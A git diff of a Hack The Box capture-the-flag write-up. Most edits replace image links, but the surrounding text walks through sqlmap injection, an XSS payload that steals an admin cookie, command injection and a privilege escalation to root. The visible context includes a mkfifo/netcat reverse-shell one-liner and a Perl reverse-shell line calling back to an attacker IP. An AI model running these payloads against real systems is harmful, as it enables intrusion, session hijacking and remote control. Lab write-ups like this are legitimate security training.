@@ -8,7 +8,7 @@ categories: [htb]
 date: "2019-05-20"
 ---
 
-![EvqqqH.png](https://s2.ax1x.com/2019/05/20/EvqqqH.png)
+![EvqqqH.png](https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/a7491cdd4fa9.png)
 
 ## Introduction
 
@@ -63,7 +63,7 @@ There are only two ports open. The port 8000 is an HTTP service which is hosted 
 
 Access to `http://10.10.10.25:8000`, there is nothing except an image. Download the image, and try to see more information about the image with ExifTool. Nothing interesting found.
 
-[![EjY0mV.png](https://s2.ax1x.com/2019/05/19/EjY0mV.png)](https://imgchr.com/i/EjY0mV)
+![EvqqqH.png](https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/a7491cdd4fa9.png)
 
 Then try to brute force the directory. Gobuster and dirbuster seem not to be very useful for this box. If you try dirb, you will soon find some important directories, including admin, login. Try to access `http://10.10.10.25:8000/login`. It is a login web page. Try to login with some default credentials. Not work. Then use burp to save the login request to a file.
 
@@ -91,7 +91,7 @@ Try to use sqlmap to brute force the login request. Due to the awful network or 
 sqlmap -r sql.req --level=5 --risk=3 --tables --threads=10
 ```
 
-[![Ejdcss.md.png](https://s2.ax1x.com/2019/05/19/Ejdcss.md.png)](https://imgchr.com/i/Ejdcss)
+![SQLMap 表列表](https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/cf2277ab1bcd.jpeg)
 
 By sqlmap, it seems that the database is SQLite and there are 5 tables. The `users` table is interesting. There may are some valid user and password. 
 
@@ -99,17 +99,15 @@ By sqlmap, it seems that the database is SQLite and there are 5 tables. The `use
 sqlmap -r sql.req --level=5 --risk=4 -T users --threads=10
 ```
 
-![Ej4acR.png](https://s2.ax1x.com/2019/05/19/Ej4acR.png)
+![SQLMap 用户表](https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/9e0b37ba5672.jpeg)
 
 A user is found. [Hashkiller](https://hashkiller.co.uk/Cracker) is a wonderful hash crack online tool. The hash can be cracked easily.
 
-![Ej464e.png](https://s2.ax1x.com/2019/05/19/Ej464e.png)
+![HashKiller](https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/5ea689a2072a.jpeg)
 
 Log in with this user. It seems to be a booking website.
 
-![Ej5nUO.png](https://s2.ax1x.com/2019/05/19/Ej5nUO.png)
-
-![Ej4Lgs.png](https://s2.ax1x.com/2019/05/19/Ej4Lgs.png)
+![Booking 网站](https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/eb4cc050814e.jpeg)
 
 Click any booking and see the booking details. It consists of two tabs, including View and Notes. In Notes, one word is interesting: "All notes must be approved by an administrator - this process can take up to 1 minute." An administrator is always attractive to hackers. It seems that the note will be approved by the administrator. So it's possible to steal the session cookie of the administrator if there is an XSS vulnerability in the note edit form. I think it's the hardest part of this box. It's not easy to find the appropriate pass way. There is a way to utilize `fromCharCode` and other skills to pass the XSS filter. The following javascript code is utilized to generate the payload:
 
@@ -126,19 +124,18 @@ console.log(result);
 var payload = `<img src="x/><script>eval(String.fromCharCode(${result}));</script>">`;
 console.log(payload);
 ```
-![Ejv2od.png](https://s2.ax1x.com/2019/05/19/Ejv2od.png)
+
+![XSS Payload](https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/f8a161dd62ee.jpeg)
 
 Set kali to listen to port 80: `nc -lvnp 80`. The code can be run in the chrome dev. Input the generated payload into the note, wait a minute the data will be sent to kali. 
 
 The cookie of the administrator is obtained which is HTML encoded. Decode it with a burp. And change the cookie in the storage of firefox. Refresh the web page. Now you can hijack the administrator session cookie. Access to `http://10.10.10.25:8000/admin`. There seems nothing special except two buttons, including Booking and Notes. 
 
-![admin](https://s2.ax1x.com/2019/05/19/Ej4oE8.png)
-
-![EjjOxK.png](https://s2.ax1x.com/2019/05/19/EjjOxK.png)
+![管理员后台](https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/297951c5e663.png)
 
 After some exploration, you will find that there is command injection in the two function url. You can try to access `http://10.10.10.25:8000/admin/export?table=notes%26ls`. You can find the directories in the exported file. One thing should be noticed, as `&` has been prohibited. So you can pass this by `%26`. Hence, it seems that the table name exists RCE. But it's limited to characters, numbers and `/`. So you should try to RCE by these. It's not possible to use the command to obtain reverse shell by command. For example, `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f`. As many characters is not allowed.
 
-![Ev7Txg.png](https://s2.ax1x.com/2019/05/20/Ev7Txg.png)
+![命令注入](https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/73398d5be3e2.jpeg)
 
 Utilize msfvenom to generate the payload:
 
@@ -164,9 +161,7 @@ run
 
 Then, we get the shell!
 
-![Evb1cF.png](https://s2.ax1x.com/2019/05/20/Evb1cF.png)
-
-![EvbGnJ.png](https://s2.ax1x.com/2019/05/20/EvbGnJ.png)
+![Meterpreter Shell](https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/a665b335c74f.jpeg)
 
 ## Privilege escalation
 
@@ -207,4 +202,4 @@ use Socket;$i="10.10.16.65";$p=3344;socket(S,PF_INET,SOCK_STREAM,getprotobyname(
 
 Set kali listen to port 3344: `nc -lvnp 3344`. In the victim, executed by: `sudo npm i rimrafall`. Now, we are root!
 
-![EvqfaR.png](https://s2.ax1x.com/2019/05/20/EvqfaR.png)
+![Root Shell](https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/d914dd41d33c.jpeg)
